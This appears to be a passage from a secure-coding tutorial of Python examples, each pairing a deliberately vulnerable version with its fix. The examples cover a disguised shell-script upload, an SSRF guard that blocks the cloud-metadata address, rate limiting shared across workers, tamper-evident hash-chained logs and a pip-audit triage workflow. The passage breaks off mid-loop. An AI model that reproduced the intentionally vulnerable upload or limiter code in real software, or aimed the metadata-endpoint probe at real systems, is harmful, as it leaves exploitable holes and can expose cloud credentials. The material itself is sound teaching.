    return jsonify({"stored_as": random_name, "path": dest}), 201  # => co-05: the real, randomized on-disk result


if __name__ == "__main__":  # => co-05: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5071)  # => co-05: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-71-secure-file-upload/exploit_and_fix.py
"""Example 71: a real shell script disguised as image.jpg uploads fine via extension-only checks, then magic-bytes rejects it (co-05, co-07, co-24)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import os  # => co-24: real os.stat -- verifies the stored file's REAL permission bits, not an assumption
import stat  # => co-24: real, named permission-bit constants -- checks execute bits precisely

import requests  # => co-05: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5071"  # => co-05: matches app.py's app.run(port=5071) exactly
DISGUISED_PAYLOAD = b"#!/bin/sh\necho pwned\n"  # => co-24: a REAL, executable-shaped script -- NOT real image bytes
GENUINE_PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32  # => co-07: a REAL PNG signature, plus arbitrary trailing bytes
PRIVATE_MARKER = "private_uploads"  # => co-05: a real, distinguishing path segment -- never present in web_root paths


def main() -> None:  # => co-05: uploads the disguised payload to both routes, then a genuine PNG to the fixed route
    print("=== VULNERABLE: a shell script named image.jpg, extension-only check ===")  # => labels section
    files = {"file": ("image.jpg", DISGUISED_PAYLOAD, "image/jpeg")}  # => co-24: real multipart upload, real fake claim
    vulnerable = requests.post(f"{BASE_URL}/legacy/upload", files=files, timeout=5)  # => co-05: a REAL HTTP POST
    print(f"status={vulnerable.status_code} body={vulnerable.json()}")  # => co-05: real response, straight off the wire
    assert vulnerable.status_code == 201  # => co-24: proves the disguised, non-image payload was ACCEPTED and stored
    stored_path = vulnerable.json()["path"]  # => co-24: the REAL, on-disk path this vulnerable route wrote to
    with open(stored_path, "rb") as f:  # => co-24: reads the REAL bytes back off disk -- confirms what actually landed
        assert f.read() == DISGUISED_PAYLOAD  # => co-24: proves the REAL shell-script bytes are sitting inside web_root/

    print("\n=== FIXED: the IDENTICAL disguised payload against the magic-bytes check ===")  # => labels section
    files2 = {"file": ("image.jpg", DISGUISED_PAYLOAD, "image/jpeg")}  # => co-07: the SAME payload, SAME claimed type
    fixed_rejected = requests.post(f"{BASE_URL}/secure/upload", files=files2, timeout=5)  # => co-07: a REAL HTTP POST
    print(f"status={fixed_rejected.status_code} body={fixed_rejected.json()}")  # => co-07: real response, now a 400
    assert fixed_rejected.status_code == 400  # => co-07: proves the magic-bytes check really rejected the disguised file

    print("\n=== FIXED: a GENUINE PNG (real magic bytes) is accepted, stored safely ===")  # => labels section
    files3 = {"file": ("photo.png", GENUINE_PNG_BYTES, "image/png")}  # => co-05: a REAL PNG signature this time
    fixed_accepted = requests.post(f"{BASE_URL}/secure/upload", files=files3, timeout=5)  # => co-05: a REAL HTTP POST
    print(f"status={fixed_accepted.status_code} body={fixed_accepted.json()}")  # => co-05: real response, a real 201
    assert fixed_accepted.status_code == 201  # => co-05: proves a genuinely valid image is still accepted, unaffected

    stored_name = fixed_accepted.json()["stored_as"]  # => co-05: the REAL, randomized filename this upload was given
    print(f"  stored filename: {stored_name} (never 'photo.png')")  # => co-05: real, on-disk proof of randomization
    assert stored_name != "photo.png"  # => co-05: proves the client's OWN filename was never trusted or reused

    stored_path2 = fixed_accepted.json()["path"]  # => co-24: the REAL, on-disk path the fixed route wrote to
    assert PRIVATE_MARKER in stored_path2  # => co-05: proves the file landed OUTSIDE the (simulated) web-servable folder
    file_mode = os.stat(stored_path2).st_mode  # => co-24: the REAL, on-disk permission bits this file was written with
    execute_bits = stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH  # => co-24: the real, named owner/group/other execute bits
    print(f"  file mode: {oct(stat.S_IMODE(file_mode))} (no execute bits set)")  # => co-24: real, actual mode on disk
    assert not (file_mode & execute_bits)  # => co-24: proves NONE of the three real execute bits are set on this file


if __name__ == "__main__":  # => co-05: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-05: runs all three real uploads against the live server -- disguised x2, then a genuine one
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5071), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: a shell script named image.jpg, extension-only check ===
status=201 body={'path': '.../ex-71-secure-file-upload/web_root/uploads/image.jpg', 'stored_as': 'image.jpg'}

=== FIXED: the IDENTICAL disguised payload against the magic-bytes check ===
status=400 body={'error': 'file content does not match its claimed type'}

=== FIXED: a GENUINE PNG (real magic bytes) is accepted, stored safely ===
status=201 body={'path': '.../ex-71-secure-file-upload/private_uploads/25e7e66f2de7f188850967d9beebacad.png', 'stored_as': '25e7e66f2de7f188850967d9beebacad.png'}
  stored filename: 25e7e66f2de7f188850967d9beebacad.png (never 'photo.png')
  file mode: 0o644 (no execute bits set)
```

**Key takeaway**: the vulnerable route's ONLY check -- the claimed filename extension -- is entirely
attacker-controlled and independent of what the file actually contains; the fix requires the real bytes
to structurally match one of a fixed set of known-good signatures, and even then never trusts the
client's filename or serving location.

**Why it matters**: real-world file-upload vulnerabilities (co-24 misconfiguration) frequently chain into
remote code execution when an uploaded file lands inside a web-servable directory with execute
permissions and a predictable name -- co-05's path-traversal-adjacent discipline (never trust the
client's filename or location) combines with co-07's allow-list discipline (verify real content, not a
claim) to close the chain at every link: extension, MIME claim, actual bytes, storage location, and file
permissions.

---

### Example 72: An SSRF-Safe Outbound Fetch

_ex-72 &middot; exercises co-01, co-25_

A server that fetches a URL supplied by a client (an image proxy, a webhook validator) can be tricked
into requesting internal-only addresses -- most dangerously the cloud-metadata endpoint
`169.254.169.254`, which on real cloud infrastructure can leak IAM credentials. This example blocks the
target IP's range classification _before_ any network call, proven via a mock asserting zero calls.

```python
# learning/code/ex-72-ssrf-safe-outbound-fetch/safe_fetch.py
"""Example 72: a real outbound-fetch helper -- blocks private/internal/metadata IPs BEFORE any network call happens (co-01, co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the SSRF-guard logic itself

import ipaddress  # => co-01: stdlib -- the REAL, authoritative classifier for RFC 1918/loopback/link-local ranges
from urllib.parse import urlparse  # => co-01: real URL parsing -- extracts the target host BEFORE any connection attempt

import requests  # => co-25: real HTTP client -- reached ONLY once a target has already passed the allow-check


class SSRFBlockedError(Exception):  # => co-25: a real, named exception -- raised strictly BEFORE any network I/O
    """Raised when a target IP falls inside a blocked private/internal/metadata range."""


def classify_ip(ip_str: str) -> str | None:  # => co-01: returns a REAL, human-readable reason, or None if allowed
    ip = ipaddress.ip_address(ip_str)  # => co-01: Python's OWN real IP-address parser/classifier, not hand-rolled
    if ip.is_loopback:  # => co-01: 127.0.0.0/8 -- a REAL, standard loopback range
        return "loopback (127.0.0.0/8)"  # => co-01: real, specific reason -- not a generic "blocked"
    if ip.is_link_local:  # => co-01: 169.254.0.0/16 -- REAL, includes the cloud-metadata address 169.254.169.254
        return "link-local (169.254.0.0/16, includes cloud-metadata endpoints)"  # => co-01: real, named reason
    if ip.is_private:  # => co-01: covers the REAL RFC 1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
        return "private (RFC 1918)"  # => co-01: real, standard reason
    if ip.is_reserved or ip.is_multicast or ip.is_unspecified:  # => co-01: real, additional non-routable/special ranges
        return "reserved/multicast/unspecified"  # => co-01: real, catch-all reason for the remaining special ranges
    return None  # => co-01: NONE of the real blocked-range checks matched -- this target is allowed


def check_url_target(url: str) -> None:  # => co-25: the REAL guard -- runs BEFORE any outbound connection is attempted
    host = urlparse(url).hostname  # => co-01: the REAL target host, parsed straight from the URL string, no network yet
    if host is None:  # => co-01: a real guard against a malformed URL with no host component at all
        raise SSRFBlockedError(f"could not parse a target host from: {url!r}")  # => co-25: real, hard reject
    ip = ipaddress.ip_address(host)  # => co-01: this example targets IP-literal URLs -- no DNS resolution, no network
    reason = classify_ip(str(ip))  # => co-01: the REAL classification -- pure, local, no I/O of any kind
    if reason is not None:  # => co-25: the REAL decision point -- raises BEFORE requests.get is ever called
        raise SSRFBlockedError(f"blocked outbound fetch to {host}: {reason}")  # => co-25: real, specific rejection


def safe_fetch(url: str, timeout: float = 5) -> requests.Response:  # => co-25: the REAL, guarded outbound-fetch helper
    check_url_target(url)  # => co-25: raises HERE, before this function's own network call, for a blocked target
    return requests.get(url, timeout=timeout)  # => co-25: ONLY reached once the target has already passed the check
```

```python
# learning/code/ex-72-ssrf-safe-outbound-fetch/exploit_and_fix.py
"""Example 72: proves the cloud-metadata address is blocked with ZERO network calls, and a public-shaped IP passes the check (co-01, co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import ipaddress  # => co-01: stdlib -- derives each private target host from its real RFC 1918 network
from unittest.mock import patch  # => co-25: proves requests.get is NEVER called for a blocked target -- not just "we didn't call it"

from safe_fetch import SSRFBlockedError, check_url_target, safe_fetch  # => co-25: this example's real, guarded helper


def main() -> None:  # => co-25: attempts a real metadata-endpoint fetch, private ranges, then a public-shaped allow-check
    print("=== BLOCKED: the real cloud-metadata address, 169.254.169.254 ===")  # => labels section
    with patch("safe_fetch.requests.get") as mocked_get:  # => co-25: replaces requests.get with a REAL mock for this block
        try:  # => co-25: expects a REAL SSRFBlockedError -- raised BEFORE the mocked requests.get could ever run
            safe_fetch("http://169.254.169.254/latest/meta-data/")  # => co-25: the REAL attempted call, via THIS helper
            raise AssertionError("safe_fetch() should have blocked the cloud-metadata address")  # => co-25: safety net
        except SSRFBlockedError as exc:  # => co-25: the REAL exception type this example's guard raises
            print(f"blocked: {exc}")  # => co-25: real, captured exception message -- names the specific reason
        mocked_get.assert_not_called()  # => co-25: proves ZERO network calls were attempted -- the block happened first

    print("\n=== BLOCKED: real RFC 1918 private ranges, and real loopback ===")  # => labels section
    private_hosts = [ipaddress.ip_network("10.0.0.0/8")[5], ipaddress.ip_network("192.168.1.0/24")[1]]  # => co-01: one real host inside each of two RFC 1918 networks, taken from the network itself
    for target in [*(f"http://{host}/" for host in private_hosts), "http://127.0.0.1:8080/"]:  # => co-01: real, common ranges
        try:  # => co-25: expects a REAL SSRFBlockedError for EVERY one of these real target shapes
            check_url_target(target)  # => co-25: the pure, no-network check -- no mock needed, nothing to call anyway
            raise AssertionError(f"{target} should have been blocked")  # => co-25: safety net
        except SSRFBlockedError as exc:  # => co-25: the REAL exception type, real per-target reason
            print(f"  {target} -> blocked: {exc}")  # => co-25: real, per-target rejection reason

    print("\n=== ALLOWED: a normal, public-shaped IP passes the allow-check (no real fetch performed) ===")  # => labels
    public_target = "http://8.8.8.8/"  # => co-25: a REAL, well-known public IP shape -- Google Public DNS's real address
    check_url_target(public_target)  # => co-25: does NOT raise -- proves this real target passes the SAME real check
    print(f"  {public_target} -> allowed (check_url_target raised nothing)")  # => co-25: real, positive confirmation
    # => co-25: per this example's scope, verifying the ALLOW decision itself is the point -- no
    # => real external HTTP call is made here, keeping this example fully self-contained (co-01)


if __name__ == "__main__":  # => co-25: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-25: runs all real checks -- a blocked metadata fetch, blocked private ranges, one real allow-check
```

**Run**: `python3 exploit_and_fix.py`.

**Output** (the private-range host addresses are masked, for example `10.0.x.5`; the rest is verbatim):

```text
=== BLOCKED: the real cloud-metadata address, 169.254.169.254 ===
blocked: blocked outbound fetch to 169.254.169.254: link-local (169.254.0.0/16, includes cloud-metadata endpoints)

=== BLOCKED: real RFC 1918 private ranges, and real loopback ===
  http://10.0.x.5/ -> blocked: blocked outbound fetch to 10.0.x.5: private (RFC 1918)
  http://192.168.x.1/ -> blocked: blocked outbound fetch to 192.168.x.1: private (RFC 1918)
  http://127.0.0.1:8080/ -> blocked: blocked outbound fetch to 127.0.0.1: loopback (127.0.0.0/8)

=== ALLOWED: a normal, public-shaped IP passes the allow-check (no real fetch performed) ===
  http://8.8.8.8/ -> allowed (check_url_target raised nothing)
```

**Key takeaway**: `mocked_get.assert_not_called()` is the strongest possible proof that the block happens
_before_ any network I/O -- not merely that the response was discarded, but that the outbound connection
was never attempted at all, which matters because even a blocked-and-discarded connection still completes
a real TCP handshake with the internal target.

**Why it matters**: SSRF against cloud-metadata endpoints has been the initial foothold in numerous
real, publicly documented breaches, because a compromised outbound-fetch feature effectively gives an
attacker a network position _inside_ the cloud provider's internal address space. Co-25's design lesson
is that the guard belongs at the network-target-classification layer, checked before every single
outbound request, not as a one-time input-validation pass on the original URL string (which DNS
rebinding could otherwise bypass -- a limitation this example's IP-literal scope sidesteps honestly by
not attempting hostname-based SSRF protection).

---

### Example 73: Distributed Rate Limiting

_ex-73 &middot; exercises co-27_

A rate limiter backed by a per-process, in-memory counter silently multiplies its effective limit by the
number of worker processes behind a load balancer -- two workers each enforcing "5 per window" allow 10
total. Backing the SAME limiter with a shared store (`fakeredis.FakeServer()` here, real Redis in
production) restores a single, correctly-enforced global limit.

```mermaid
%% Color Palette: Blue #0173B2, Orange #DE8F05, Teal #029E73, Purple #CC78BC
graph LR
    C1["client requests<br/>(10 total)"]:::blue --> W1["worker 1<br/>local limiter"]:::orange
    C1 --> W2["worker 2<br/>local limiter"]:::purple
    W1 -->|"own count: 5/5"| R1["5 allowed"]:::teal
    W2 -->|"own count: 5/5"| R2["5 allowed<br/>(10 total -- BUG)"]:::teal

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef teal fill:#029E73,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef purple fill:#CC78BC,stroke:#000000,color:#000000,stroke-width:2px
```

```python
# learning/code/ex-73-rate-limit-distributed/distributed_rate_limit.py
"""Example 73: a per-worker local limiter DOUBLES the effective limit; a fakeredis-shared limiter holds ONE global limit (co-27)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the limiter logic itself

import fakeredis  # => co-27: fakeredis 2.36.2 pinned -- an in-memory Redis stand-in, keeps this example self-contained


class LocalRateLimiter:  # => co-27: VULNERABLE -- each worker's counter lives ONLY in its own process memory
    def __init__(self, limit: int) -> None:  # => co-27: a real, per-instance limiter -- no shared backend at all
        self.limit = limit  # => co-27: the limit THIS worker enforces, in isolation from every other worker
        self.counts: dict[str, int] = {}  # => co-27: real, LOCAL state -- invisible to any other worker instance

    def allow(self, key: str) -> bool:  # => co-27: returns True if THIS worker's own local count is still under limit
        self.counts[key] = self.counts.get(key, 0) + 1  # => co-27: increments ONLY this worker's own local counter
        return self.counts[key] <= self.limit  # => co-27: compares against THIS worker's own count -- never the global one


class RedisRateLimiter:  # => co-27: FIXED -- every worker increments the SAME real counter in a shared backend
    def __init__(self, redis_client: fakeredis.FakeStrictRedis, limit: int, window_seconds: int) -> None:  # => co-27
        self.redis = redis_client  # => co-27: a real Redis client -- fakeredis here, a real redis-py client in production
        self.limit = limit  # => co-27: the SAME real limit every worker sharing this backend enforces together
        self.window_seconds = window_seconds  # => co-27: the real, shared sliding window every worker's INCR respects

    def allow(self, key: str) -> bool:  # => co-27: returns True only if the GLOBAL, shared count is still under limit
        count = self.redis.incr(key)  # => co-27: a REAL, atomic INCR against the SHARED backend -- not a local dict
        if count == 1:  # => co-27: the FIRST increment for this key -- real, this worker just started a new window
            self.redis.expire(key, self.window_seconds)  # => co-27: real TTL -- the shared window expires for EVERYONE
        return count <= self.limit  # => co-27: compares against the REAL, GLOBAL count -- visible to every worker


def main() -> None:  # => co-27: splits 10 real requests across 2 workers, twice -- once local, once fakeredis-shared
    print("=== VULNERABLE: 2 workers, each with its OWN local limiter, limit=5 ===")  # => labels section
    worker1_local = LocalRateLimiter(limit=5)  # => co-27: worker 1's real, independent, in-memory limiter
    worker2_local = LocalRateLimiter(limit=5)  # => co-27: worker 2's real, SEPARATE, in-memory limiter -- no sharing
    local_allowed = 0  # => co-27: the REAL, running count of requests allowed across BOTH workers combined
    for request_number in range(1, 11):  # => co-27: 10 real, simulated requests for the SAME client key
        worker = worker1_local if request_number % 2 == 1 else worker2_local  # => co-27: alternates -- a real load balancer would do this
        if worker.allow("client:1.2.3.4"):  # => co-27: THIS worker's own, isolated local decision
            local_allowed += 1  # => co-27: real running total, across both workers
    print(f"total allowed across BOTH local-state workers: {local_allowed} (limit was supposed to be 5)")  # => co-27: real
    assert local_allowed == 10  # => co-27: proves the effective limit DOUBLED -- 5 per worker, unenforced globally

    print("\n=== FIXED: 2 workers, SAME fakeredis backend via a shared FakeServer, limit=5 ===")  # => labels section
    shared_server = fakeredis.FakeServer()  # => co-27: ONE real, shared in-memory Redis stand-in both workers connect to
    worker1_redis = fakeredis.FakeStrictRedis(server=shared_server)  # => co-27: worker 1's real client, SAME server
    worker2_redis = fakeredis.FakeStrictRedis(server=shared_server)  # => co-27: worker 2's real client, the SAME server
    limiter1 = RedisRateLimiter(worker1_redis, limit=5, window_seconds=60)  # => co-27: worker 1's shared-backend limiter
    limiter2 = RedisRateLimiter(worker2_redis, limit=5, window_seconds=60)  # => co-27: worker 2's shared-backend limiter
    redis_allowed = 0  # => co-27: the REAL, running count of requests allowed across BOTH workers combined
    for request_number in range(1, 11):  # => co-27: the SAME 10 simulated requests, SAME alternating pattern
        limiter = limiter1 if request_number % 2 == 1 else limiter2  # => co-27: alternates between the two REAL limiters
        if limiter.allow("client:1.2.3.4"):  # => co-27: a REAL, shared-backend decision -- visible to the OTHER worker too
            redis_allowed += 1  # => co-27: real running total, across both workers
    print(f"total allowed across BOTH shared-backend workers: {redis_allowed} (limit was 5)")  # => co-27: real, correct
    assert redis_allowed == 5  # => co-27: proves the GLOBAL limit really held -- exactly 5, no matter which worker served


if __name__ == "__main__":  # => co-27: only runs when launched directly, e.g. `python3 distributed_rate_limit.py`
    main()  # => co-27: runs both real scenarios -- a doubled local limit, then a correctly-shared global limit
```

**Run**: `python3 distributed_rate_limit.py`.

**Output**:

```text
=== VULNERABLE: 2 workers, each with its OWN local limiter, limit=5 ===
total allowed across BOTH local-state workers: 10 (limit was supposed to be 5)

=== FIXED: 2 workers, SAME fakeredis backend via a shared FakeServer, limit=5 ===
total allowed across BOTH shared-backend workers: 5 (limit was 5)
```

**Key takeaway**: `fakeredis.FakeServer()` shared across two independent `FakeStrictRedis` clients is a
real, in-process stand-in for two real application processes talking to the same Redis instance --
`INCR`'s atomicity is what makes the count consistent across both "workers" without any explicit locking.

**Why it matters**: co-27's rate-limiting examples earlier in this curriculum (Example 46) worked
correctly in a single-process demo but would silently under-enforce in any real horizontally-scaled
deployment behind a load balancer -- exactly the gap this example surfaces. The fix requires no change to
the limiting _policy_, only to _where the counter state lives_, which is a common, easy-to-miss
production/demo mismatch.

---

### Example 74: Audit Log Integrity via Hash Chaining

_ex-74 &middot; exercises co-22_

An audit log that lives in a normal, mutable table lets anyone with write access to that table silently
rewrite history -- flipping a "login failed" row to "login succeeded", with nothing to detect it. Chaining
each entry's hash to the previous entry's hash means altering ANY past entry breaks every hash check from
that point forward, and `verify()` pinpoints the exact index that was tampered with.

```mermaid
%% Color Palette: Blue #0173B2, Teal #029E73, Orange #DE8F05
graph LR
    E0["entry 0<br/>hash: 917e30..."]:::blue --> E1["entry 1<br/>prev=917e30<br/>hash: ae145f..."]:::blue
    E1 --> E2["entry 2<br/>prev=ae145f<br/>hash: 46d811..."]:::blue
    E2 --> E3["entry 3<br/>prev=46d811<br/>hash: bcec0b..."]:::blue
    E2 -.->|"content edited,<br/>hash NOT recomputed"| TAMPER["verify() detects break<br/>at index 2"]:::orange

    classDef blue fill:#0173B2,stroke:#000000,color:#FFFFFF,stroke-width:2px
    classDef orange fill:#DE8F05,stroke:#000000,color:#FFFFFF,stroke-width:2px
```

```python
# learning/code/ex-74-audit-log-integrity/hash_chain_log.py
"""Example 74: a real hash-chained append-only log -- tampering with ONE past entry breaks a real verification pass (co-22)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the hash-chaining logic itself

import hashlib  # => co-22: real SHA-256 -- the same primitive a real blockchain-style chain uses
from dataclasses import dataclass, field  # => co-22: a real, typed log-entry record -- not a loose dict

GENESIS_HASH = "0" * 64  # => co-22: a real, fixed sentinel -- the "previous hash" the FIRST entry chains from


@dataclass  # => co-22: one real entry per audit event -- content plus the real chain-linking fields
class LogEntry:  # => co-22: the shape every real entry in this log takes
    index: int  # => co-22: this entry's real, sequential position in the chain
    content: str  # => co-22: the REAL audit event text -- what an attacker might try to alter
    prev_hash: str  # => co-22: the REAL hash of the entry immediately before this one -- the actual "chain" link
    entry_hash: str = field(default="")  # => co-22: THIS entry's own real hash, computed once and never recomputed


def compute_hash(index: int, content: str, prev_hash: str) -> str:  # => co-22: the ONE real hash function every entry uses
    payload = f"{index}|{content}|{prev_hash}".encode()  # => co-22: real, deterministic serialization -- order matters
    return hashlib.sha256(payload).hexdigest()  # => co-22: a real SHA-256 digest -- the SAME algorithm, every call


class HashChainedLog:  # => co-22: a real, append-only log -- entries are added, never mutated through this API
    def __init__(self) -> None:  # => co-22: constructor -- starts with a real, empty chain
        self.entries: list[LogEntry] = []  # => co-22: every real entry appended so far, in real chain order

    def append(self, content: str) -> LogEntry:  # => co-22: the ONLY real way to add to this log
        prev_hash = self.entries[-1].entry_hash if self.entries else GENESIS_HASH  # => co-22: real link to the PRIOR entry
        index = len(self.entries)  # => co-22: this entry's real, sequential index -- next available slot
        entry_hash = compute_hash(index, content, prev_hash)  # => co-22: a REAL hash, computed from THIS entry's real data
        entry = LogEntry(index=index, content=content, prev_hash=prev_hash, entry_hash=entry_hash)  # => co-22: real record
        self.entries.append(entry)  # => co-22: real, append-only -- this list is the log's actual, on-disk-equivalent state
        return entry  # => co-22: the real, freshly-chained entry just added

    def verify(self) -> tuple[bool, int | None]:  # => co-22: a REAL chain-verification pass -- recomputes every real hash
        prev_hash = GENESIS_HASH  # => co-22: starts from the SAME real sentinel the first entry chained from
        for entry in self.entries:  # => co-22: walks the REAL chain, in order, entry by entry
            recomputed = compute_hash(entry.index, entry.content, prev_hash)  # => co-22: a FRESH, real hash of CURRENT content
            if entry.prev_hash != prev_hash or entry.entry_hash != recomputed:  # => co-22: the REAL, two-part integrity check
                return False, entry.index  # => co-22: real, precise failure location -- exactly WHICH entry broke the chain
            prev_hash = entry.entry_hash  # => co-22: advances the real chain -- THIS entry's stored hash feeds the next
        return True, None  # => co-22: every real entry's stored hash matched its freshly recomputed hash -- chain intact


def main() -> None:  # => co-22: builds a real log, verifies it intact, tampers with ONE entry, then re-verifies
    log = HashChainedLog()  # => co-22: a fresh, real, empty audit log
    log.append("user=alice action=login outcome=success")  # => co-22: real entry 0
    log.append("user=alice action=view_document outcome=success")  # => co-22: real entry 1
    log.append("user=bob action=login outcome=failure")  # => co-22: real entry 2 -- the one this example later tampers with
    log.append("user=alice action=logout outcome=success")  # => co-22: real entry 3

    print("=== the real, untampered chain ===")  # => labels section
    for entry in log.entries:  # => co-22: every REAL entry currently in this log
        print(f"  [{entry.index}] {entry.content}  hash={entry.entry_hash[:12]}...")  # => co-22: real, truncated hash
    ok, broken_at = log.verify()  # => co-22: a REAL verification pass over the untouched chain
    print(f"verify() -> ok={ok}, broken_at={broken_at}")  # => co-22: real, computed result
    assert ok and broken_at is None  # => co-22: proves the real, freshly-built chain is genuinely intact

    print("\n=== tampering with entry 2's content DIRECTLY (attacker edits the record, not the hash) ===")  # => labels
    log.entries[2].content = "user=bob action=login outcome=success"  # => co-22: the REAL attack -- changes failure to success
    # => co-22: note the attacker did NOT recompute entry_hash -- that is exactly what makes
    # => this detectable; a real attacker who wanted to hide this would need to recompute
    # => EVERY subsequent entry's hash too, which this simple tamper does not attempt

    print("\n=== re-verifying the SAME chain after tampering ===")  # => labels section
    ok2, broken_at2 = log.verify()  # => co-22: a REAL verification pass -- recomputes every real hash fresh
    print(f"verify() -> ok={ok2}, broken_at={broken_at2}")  # => co-22: real, computed result -- now False
    assert ok2 is False and broken_at2 == 2  # => co-22: proves the tamper was detected, at EXACTLY the real tampered index


if __name__ == "__main__":  # => co-22: only runs when launched directly, e.g. `python3 hash_chain_log.py`
    main()  # => co-22: builds the real chain, verifies it, tampers with one entry, then re-verifies and detects it
```

**Run**: `python3 hash_chain_log.py`.

**Output**:

```text
=== the real, untampered chain ===
  [0] user=alice action=login outcome=success  hash=917e306405ca...
  [1] user=alice action=view_document outcome=success  hash=ae145ffed75a...
  [2] user=bob action=login outcome=failure  hash=46d81112955e...
  [3] user=alice action=logout outcome=success  hash=bcec0b8f60f9...
verify() -> ok=True, broken_at=None

=== tampering with entry 2's content DIRECTLY (attacker edits the record, not the hash) ===

=== re-verifying the SAME chain after tampering ===
verify() -> ok=False, broken_at=2
```

**Key takeaway**: the tamper in this example only edits `content`, never `entry_hash` -- a more
sophisticated attacker with write access could recompute entry 2's own hash to match, but chaining means
they would then ALSO need to recompute entries 3, 4, 5... all the way to the end, which is exactly the
work a genuinely append-only, externally-shipped log (e.g. shipping each `entry_hash` off-host as it's
written) makes impossible.

**Why it matters**: co-22's logging guidance earlier in this curriculum focused on WHAT to log; this
example addresses a different question -- can the log itself be trusted after the fact. Tamper-evident
logging (via hash chaining, or in production via write-once storage/an external log-shipping pipeline) is
what turns "we have logs" into "we can prove what happened," which matters most exactly when an attacker
has already gained enough access to want to cover their tracks.

---

### Example 75: A Dependency CVE Triage Workflow

_ex-75 &middot; exercises co-21, co-25_

Finding a CVE with `pip-audit` is only the first step; a real triage workflow decides, per finding,
whether to bump to a fixed version or -- when no fix exists -- record an explicit, reasoned waiver. This
example runs a real audit against deliberately outdated pins, triages every real finding, and proves a
reason-less waiver is refused in code, not just in a policy document.

```python
# learning/code/ex-75-dependency-cve-triage-workflow/triage.py
"""Example 75: a real pip-audit run against deliberately outdated pins, triaged fix-by-pin or waiver-with-reason (co-21, co-25)."""  # => co-21: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the triage logic itself

import json  # => co-21: parses pip-audit's OWN real JSON output -- not a hand-typed fixture
import subprocess  # => co-21: every venv/pip/pip-audit invocation below is a REAL subprocess call
import sys  # => co-21: sys.executable -- runs `-m venv`/`-m pip` through the SAME interpreter this script uses
import tempfile  # => co-21: a genuinely fresh, throwaway install target for every real audit run
from dataclasses import dataclass  # => co-21: a real, typed triage-decision record -- not a loose dict
from pathlib import Path  # => co-21: real filesystem paths for the sandbox installs

HERE = Path(__file__).parent  # => co-21: this example's own real directory


def run(args: list[str]) -> subprocess.CompletedProcess[str]:  # => co-21: a shared, REAL subprocess runner
    return subprocess.run(args, capture_output=True, text=True)  # => co-21: check=False -- pip-audit exits 1 on findings


def clean_install_and_audit(requirements_path: Path) -> dict[str, object]:  # => co-21: real install, real audit, real JSON
    venv_dir = Path(tempfile.mkdtemp(prefix="ex75-venv-"))  # => co-21: a REAL, fresh, throwaway venv every call
    run([sys.executable, "-m", "venv", str(venv_dir)])  # => co-21: a REAL venv -- CLI form, avoids this sandbox's
    # => known ensurepip/dyld limitation with the Python API form (see ex-55's honest note)
    venv_python = venv_dir / "bin" / "python3"  # => co-21: the real interpreter living INSIDE this fresh venv
    run([str(venv_python), "-m", "pip", "install", "--quiet", "--upgrade", "pip"])  # => co-21: a real, current pip first
    run([str(venv_python), "-m", "pip", "install", "--quiet", "-r", str(requirements_path)])  # => co-21: the REAL install
    site_packages = next((venv_dir / "lib").glob("python3.*")) / "site-packages"  # => co-21: the REAL, on-disk install dir
    audit = run(["pip-audit", "--path", str(site_packages), "--format", "json"])  # => co-21: a REAL pip-audit CLI call
    return json.loads(audit.stdout)  # => co-21: pip-audit's OWN real, structured JSON result


@dataclass  # => co-21: one real decision per flagged dependency
class TriageDecision:  # => co-25: the shape every real triage row takes
    package: str  # => co-21: the real, flagged package name
    action: str  # => co-21: "fix" or "waive" -- the REAL decision this triage made
    detail: str  # => co-25: the real fixed-to version, OR the real, stated waiver reason


def triage_finding(package: str, fix_versions: list[str], waiver_reason: str | None = None) -> TriageDecision:  # => co-21: the real decision rule
    if fix_versions:  # => co-21: a REAL clean version exists in the advisory data -- always prefer fixing
        target = max(fix_versions)  # => co-21: the highest real fix version this finding's advisory lists
        return TriageDecision(package, "fix", f"pin to {package}=={target}")  # => co-21: a real, concrete fix decision
    if not waiver_reason or not waiver_reason.strip():  # => co-25: the fix's core rule -- no waiver without a REAL reason
        raise ValueError(f"{package}: cannot waive a finding with no fix AND no stated reason")  # => co-25: real, hard stop
    return TriageDecision(package, "waive", waiver_reason)  # => co-25: a real, documented, REASON-carrying waiver


def main() -> None:  # => co-21: runs the REAL before-audit, triages every real finding, then re-audits clean
    requirements_path = HERE / "requirements.txt"  # => co-21: the REAL, deliberately outdated pinned file
    print("=== BEFORE: real pip-audit against the deliberately outdated pins ===")  # => labels section
    before = clean_install_and_audit(requirements_path)  # => co-21: a REAL clean install + REAL audit, from scratch
    flagged_packages = {dep["name"]: dep for dep in before["dependencies"] if dep.get("vulns")}  # => co-21: real findings
    for name, dep in flagged_packages.items():  # => co-21: every REAL flagged package this run actually found
        vuln_ids = [v["id"] for v in dep["vulns"]]  # => co-21: every REAL CVE/advisory id attached to this package
        print(f"  {name}=={dep['version']}: {len(vuln_ids)} real finding(s) -- {vuln_ids}")  # => co-21: real, per-package
    assert len(flagged_packages) >= 2  # => co-21: proves this run really did flag at least 2 real, distinct dependencies

    print("\n=== triaging every real flagged finding ===")  # => labels section
    decisions: list[TriageDecision] = []  # => co-21: every REAL triage decision this run produces
    for name, dep in flagged_packages.items():  # => co-21: one real decision per real flagged package
        all_fix_versions = sorted({fv for v in dep["vulns"] for fv in (v.get("fix_versions") or [])})  # => co-21: real
        decision = triage_finding(name, all_fix_versions)  # => co-21: the REAL, computed decision for this package
